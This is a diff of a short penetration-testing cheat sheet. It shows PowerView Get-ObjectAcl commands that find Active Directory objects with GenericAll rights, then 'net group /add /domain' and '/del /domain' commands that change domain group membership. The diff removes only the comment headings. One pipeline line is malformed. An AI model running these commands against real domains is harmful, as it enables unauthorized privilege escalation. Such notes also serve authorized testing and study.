@@ -1,12 +1,7 @@
-#enumerate ACL object
 
-##Get-ObjectAcl with PowerView
 PW$>Get-ObjectAcl -Identity <object>
-##Get interesting Permission
 PW$>Get-ObjectAcl -Identity <object/e.g.groups> | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select Security Identifier,ActiveDirectoryRights "$sid","$sid2" | Convert-SidToName
 
-##if you have a rights permission you can add user to domain group ..
 net group "$group" $user /add /domain
 
-##or delete 
 net group "$group" $user /del /domain
